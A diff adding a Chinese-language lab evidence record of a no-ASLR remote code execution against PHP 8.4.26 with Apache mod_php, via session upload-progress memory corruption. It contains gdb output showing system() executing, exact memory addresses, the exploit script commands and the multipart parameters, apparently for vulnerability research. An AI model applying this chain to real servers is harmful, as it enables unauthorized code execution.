@@ -1,0 +1,77 @@
+# no-ASLR RCE 证据记录
+
+日期：2026-10-21
+目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php，no-ASLR worker
+约束：纯 HTTP，未在目标 webroot 写任何 PHP；页面为普通 `echo`（历史记录：当次页面含 `session_start()`；该链不依赖它，已在纯 echo 页面复验）
+
+## 1. 成功运行的 gdb 关键输出
+
+```text
+REF
+ARR T
+#0  zend_array_destroy (ht=0x7ffff5e6e0d8)
+#1  0x00007ffff4a13c35 in i_zval_ptr_dtor (zval_ptr=0x7ffff5e02328)
+#2  zend_reference_destroy (ref=0x7ffff5e02320)
+#3  0x00007ffff47e77cf in php_session_track_init ()
+HASH T
+SYSTEM rdi=0x7ffff5e6e118 [id>/tmp/p1]
+#0  __libc_system (line=0x7ffff5e6e118 "id>/tmp/p1")
+#1  0x00007ffff49cbc9d in zend_hash_destroy (ht=ht@entry=0x7ffff5e6e0d8)
+#2  0x00007ffff49cbff8 in zend_array_destroy (ht=0x7ffff5e6e0d8)
+#3  0x00007ffff4a13c35 in i_zval_ptr_dtor (zval_ptr=0x7ffff5e02328)
+#4  zend_reference_destroy (ref=0x7ffff5e02320)
+#5  0x00007ffff47e77cf in php_session_track_init ()
+...
+Program received signal SIGABRT, Aborted.
+#4  zend_mm_panic ("zend_mm_heap corrupted")
+#5  zend_mm_realloc_heap (...)
+```
+
+`system` 已经在 abort 前执行。
+
+## 2. proof 文件
+
+```text
+-rw-r--r-- 1 www-data www-data 54 Oct 21 16:13 /tmp/p1
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## 3. 关键地址（no-ASLR）
+
+```text
+R0 (stale zend_reference)       0x7ffff5e02320
+56B raw buffer (R0-0x10)        0x7ffff5e02310
+fake HT data (192B string data) 0x7ffff5e6e0d8
+libc system                     0x7ffff7d13490
+libphp base (reference)         0x7ffff47c0000
+libphp zval_ptr_dtor (reference) 0x7ffff4a13c35
+```
+
+## 4. 运行命令
+
+```bash
+# A: OOM, 留下跨请求悬空 reference
+python3 send_a_ps.py 17 19 3 12
+
+# B: fake reference + fake HashTable + system
+python3 send_b_rce2.py 7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
+
+cat /tmp/p1
+```
+
+B 的 multipart 关键参数：
+
+```text
+boundary              = "B" * 10
+PHPSESSID             = attacksessionid0001
+PHP_SESSION_UPLOAD_PROGRESS = pwn
+7 个 priming 字段     = 31 字符名 + 167B fake HashTable
+2 个 fake-ref 字段    = 短名 + 55B fake reference
+```
+
+## 5. 备注
+
+- `session.upload_progress.cleanup=On` 是 B 走到 END cleanup/track_init 的必要条件。
+- `memory_limit=8M` 是 lab 里让 A 容易 OOM 的配置；漏洞本身依赖
+  `session.upload_progress.enabled=On`（默认）。
+- 该记录只证明 no-ASLR；ASLR 的两条路径分析见 `../ASLR_PATHS.md`。
